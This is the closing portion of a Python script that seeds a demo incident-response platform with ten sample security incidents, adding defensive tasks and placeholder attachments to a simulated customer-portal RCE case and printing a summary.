    t4 = await add_task(client, token, iid, {"title": "Forensically image portal-web-01 and portal-web-02", "priority": "critical", "phase": "analysis"})
    t5 = await add_task(client, token, iid, {"title": "Determine if portal DB was accessed (query logs, pg_stat_activity)", "priority": "critical", "phase": "analysis"})
    t6 = await add_task(client, token, iid, {"title": "Audit S3 portal-uploads bucket for unauthorised access or downloads", "priority": "high", "phase": "analysis"})
    t7 = await add_task(client, token, iid, {"title": "Upgrade PortalCMS to 4.2.2 (patched) and redeploy", "priority": "critical", "phase": "remediation"})
    t8 = await add_task(client, token, iid, {"title": "Notify affected customers if PII confirmed accessed", "priority": "high", "phase": "remediation"})
    t9 = await add_task(client, token, iid, {"title": "Set WAF to enforcement (blocking) mode", "priority": "high", "phase": "remediation"})

    await update_task(client, token, iid, t1, {"status": "done"})
    await update_task(client, token, iid, t2, {"status": "done"})
    await update_task(client, token, iid, t3, {"status": "done"})
    await update_task(client, token, iid, t4, {"status": "in_progress"})
    await update_task(client, token, iid, t5, {"status": "in_progress"})

    await upload_attachment(client, token, iid, "vuln_scan_report.txt", fake_vuln_scan(), "text/plain")
    await upload_attachment(client, token, iid, "waf_alert_screenshot.png", base64.b64decode(TINY_PNG_B64), "image/png")
    await upload_attachment(client, token, iid, "stage2_payload_lab_only.txt", fake_malware_sample(), "text/plain")

    print(f"    ✅  INC-10 created (id={iid[:8]})")
    return iid


async def main():
    print("\n[SEED]  Seeding incident-response-platform with demo data...")
    print("-" * 60)

    async with httpx.AsyncClient(base_url=BASE, timeout=30.0) as client:
        print("\n[AUTH]  Authenticating...")
        token = await login(client)
        print("  ✅  Authenticated")

        print("\n[DATA]  Creating incidents...")
        await seed_incident_1(client, token)
        await seed_incident_2(client, token)
        await seed_incident_3(client, token)
        await seed_incident_4(client, token)
        await seed_incident_5(client, token)
        await seed_incident_6(client, token)
        await seed_incident_7(client, token)
        await seed_incident_8(client, token)
        await seed_incident_9(client, token)
        await seed_incident_10(client, token)

    print("\n" + "-" * 60)
    print("✅  Seeding complete! 10 incidents created.")
    print("""
Summary:
  INC-01  Spear Phishing — Finance Team            sev2  CLOSED
  INC-02  LockBit 3.0 Ransomware                   sev1  CONTAINED
  INC-03  Suspicious Login — Nigeria               sev3  MONITORING
  INC-04  Emotet Malware — HR Dept                 sev1  CLOSED
  INC-05  Data Exfiltration via Dropbox (insider)  sev2  CLOSED
  INC-06  SSH Brute Force — DMZ Servers            sev3  CLOSED
  INC-07  Insider Threat — DB Access               sev2  MONITORING
  INC-08  Supply Chain Compromise — npm            sev1  OPEN
  INC-09  BEC — Wire Transfer Fraud                sev2  CLOSED
  INC-10  Zero-Day RCE — Customer Portal           sev1  OPEN
""")


asyncio.run(main())
